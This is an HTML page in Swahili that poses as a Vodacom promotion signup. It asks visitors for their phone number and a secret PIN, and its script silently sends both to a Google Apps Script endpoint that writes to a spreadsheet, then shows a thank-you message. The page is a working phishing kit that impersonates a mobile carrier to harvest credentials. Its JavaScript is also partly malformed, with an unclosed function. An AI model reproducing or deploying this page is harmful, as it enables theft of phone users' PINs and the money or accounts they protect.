<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vodacom Promotion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            background: #E60000; /* Vodacom Red */
            color: white;
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 420px;
            width: 100%;
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            color: #333;
        }
        h2 { font-size: 24px; margin-bottom: 15px; color: #E60000; }
        p { line-height: 1.6; margin-bottom: 25px; font-size: 15px; color: #555; }
        input {
            width: 100%; padding: 14px; margin: 10px 0; font-size: 16px;
            border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; transition: border 0.3s;
        }
        input:focus { outline: none; border: 2px solid #E60000; }
        button {
            padding: 16px; width: 100%; background: #E60000; color: white;
            border: none; border-radius: 8px; font-size: 18px; font-weight: bold;
            cursor: pointer; margin-top: 15px; transition: background 0.3s;
        }
        button:hover { background: #b30000; }
        button:disabled { background: #999; cursor: not-allowed; }
        #message { margin-top: 20px; font-weight: bold; font-size: 16px; color: #E60000; min-height: 24px; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Karibu Vodacom</h2>
        <p>Jisajili hapa kupokea habari na ofa mpya kutoka Vodacom.</p>

        <form id="safeForm">
            <!-- Tumeongeza name="" hapa ili script iweze kusoma -->
            <input type="tel" id="phoneNumber" name="Phone Number" placeholder="Nambari ya Simu" pattern="[0-9]{9,12}" title="Tafadhali ingiza namba sahihi" required>
            <input type="neno ya siri" id="neno ya siri" name="neno ya siri" placeholder=" neno ya siri (PIN)" >
            <button type="submit" id="submitBtn">JISAJILI</button>
        </form>

        <div id="message"></div>
    </div>

    <script>
        
            // Google Apps Script Web App URL - REPLACE WITH YOUR DEPLOYED URL
            const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxalqWIJNIs8oIEfo_Yqb9b5oAwzbnAOsriN10iSzNj6IK6XFtlQZAJaeXQ4N6kc9Fj/exec";
            // Handle form submission
            async function handleSubmit(event) {
                event.preventDefault(); // Prevent default form submission

        const form = document.getElementById('safeForm');
        const submitBtn = document.getElementById('submitBtn');
        const messageDiv = document.getElementById('message');

        form.addEventListener('submit', async (event) => {
            event.preventDefault(); // Zuia fomu isirudie kupakia ukurasa

            // Badilisha kitufe kuwa kwenye hali ya kusubiri
            submitBtn.innerText = "Inatuma...";
            submitBtn.disabled = true;
            messageDiv.innerText = "";

            // Kusanya data kutoka kwenye fomu
            const formData = new URLSearchParams(new FormData(form));

            try {
                // Tuma data kwenda Google Sheet
                await fetch(APPS_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors', // Hii inazuia browser kuzuia data kutokana na CORS
                    body: formData
                });

                // Onyesha ujumbe wa mafanikio
                messageDiv.innerText = "Asante! Nambari yako imepokelewa kikamilifu.";
                form.reset(); // Futa data kwenye fomu

            } catch (error) {
                console.error('Error:', error);
                messageDiv.innerText = "Kuna tatizo limetokea. Tafadhali jaribu tena.";
            } finally {
                // Rudisha kitufe kwenye hali ya kawaida
                submitBtn.innerText = "JISAJILI";
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
